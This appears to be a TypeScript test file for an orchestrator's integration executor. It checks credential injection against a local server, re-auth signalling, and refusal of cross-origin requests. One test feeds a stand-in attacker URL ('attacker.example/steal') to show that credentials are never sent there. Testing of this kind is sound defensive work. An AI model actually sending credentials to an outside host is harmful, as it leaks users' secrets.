import test from "node:test";
import assert from "node:assert/strict";
import http from "node:http";
import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";

/*
 * End-to-end execution: create a connection in a temp home, then run a request
 * against a local server and assert Controller injected the auth (query key)
 * plus the transport's constant header — without the caller supplying either.
 * Uses normal imports; paths.ts reads CODING_ORCHESTRATOR_HOME at call time.
 */
async function withTempHomeAndServer(
  handler: (req: http.IncomingMessage, body: string) => { status: number; body: string },
  fn: (mods: {
    integrations: typeof import("../integrations.js");
    execute: typeof import("../integration-execute.js");
    baseUrl: string;
  }) => Promise<void>
): Promise<void> {
  const dir = await fs.mkdtemp(path.join(os.tmpdir(), "exec-test-"));
  const previous = process.env.CODING_ORCHESTRATOR_HOME;
  process.env.CODING_ORCHESTRATOR_HOME = dir;

  const captured: { url?: string; headers?: http.IncomingHttpHeaders; body?: string } = {};
  const server = http.createServer((req, res) => {
    let body = "";
    req.on("data", (c) => (body += c));
    req.on("end", () => {
      captured.url = req.url;
      captured.headers = req.headers;
      captured.body = body;
      const r = handler(req, body);
      res.writeHead(r.status, { "Content-Type": "application/json" });
      res.end(r.body);
    });
  });
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  const port = (server.address() as { port: number }).port;

  try {
    const integrations = await import("../integrations.js");
    const execute = await import("../integration-execute.js");
    (globalThis as { __captured?: typeof captured }).__captured = captured;
    await fn({ integrations, execute, baseUrl: `http://127.0.0.1:${port}` });
  } finally {
    await new Promise<void>((resolve) => server.close(() => resolve()));
    if (previous === undefined) delete process.env.CODING_ORCHESTRATOR_HOME;
    else process.env.CODING_ORCHESTRATOR_HOME = previous;
    await fs.rm(dir, { recursive: true, force: true });
  }
}

test("executeRequest injects a query-key credential and transport header", async () => {
  await withTempHomeAndServer(
    () => ({ status: 200, body: JSON.stringify({ ok: true }) }),
    async ({ integrations, execute, baseUrl }) => {
      const connection = await integrations.createConnection({
        name: "Echo",
        transport: { mode: "rest", config: { baseUrl }, headers: { "X-Test": "1" }, query: {} },
        auth: {
          schemes: [
            { acquisition: "static", attachment: { kind: "query", name: "token" }, secret: "SEKRET" },
          ],
        },
      });

      const result = await execute.executeRequest(connection, {
        method: "POST",
        path: "/echo",
        body: { a: 1 },
      });

      assert.equal(result.ok, true);
      if (result.ok) assert.equal(result.status, 200);

      const captured = (globalThis as { __captured?: { url?: string; headers?: Record<string, string>; body?: string } }).__captured!;
      assert.ok(captured.url?.includes("token=SEKRET"), `auth query missing: ${captured.url}`);
      assert.equal(captured.headers?.["x-test"], "1");
      assert.equal(captured.body, JSON.stringify({ a: 1 }));
    }
  );
});

test("executeRequest refuses cross-origin URLs and never sends the credential", async () => {
  await withTempHomeAndServer(
    () => ({ status: 200, body: "{}" }),
    async ({ integrations, execute, baseUrl }) => {
      const connection = await integrations.createConnection({
        name: "Pinned",
        transport: { mode: "rest", config: { baseUrl }, headers: {}, query: {} },
        auth: {
          schemes: [
            {
              acquisition: "static",
              attachment: { kind: "header", name: "Authorization", prefix: "Bearer " },
              secret: "TOPSECRET",
            },
          ],
        },
      });

      // Absolute URL to a different host — must be refused before any request.
      const result = await execute.executeRequest(connection, {
        method: "GET",
        path: "https://attacker.example/steal",
      });
      assert.equal(result.ok, false);
      if (!result.ok) assert.match(result.error, /Refusing to send credentials/);

      // The local server never received a request (nothing was captured).
      const captured = (globalThis as { __captured?: { url?: string } }).__captured!;
      assert.equal(captured.url, undefined);
    }
  );
});

test("executeRequest surfaces a re-auth signal when a credential is missing", async () => {
  await withTempHomeAndServer(
    () => ({ status: 200, body: "{}" }),
    async ({ integrations, execute, baseUrl }) => {
      const connection = await integrations.createConnection({
        name: "NeedsAuth",
        transport: { mode: "rest", config: { baseUrl }, headers: {}, query: {} },
        // Bearer scheme with no secret stored.
        auth: {
          schemes: [
            {
              acquisition: "static",
              attachment: { kind: "header", name: "Authorization", prefix: "Bearer " },
            },
          ],
        },
      });

      const result = await execute.executeRequest(connection, { method: "GET", path: "/" });
      assert.equal(result.ok, false);
      if (!result.ok) assert.equal(result.reauth?.reason, "acquire");
    }
  );
});
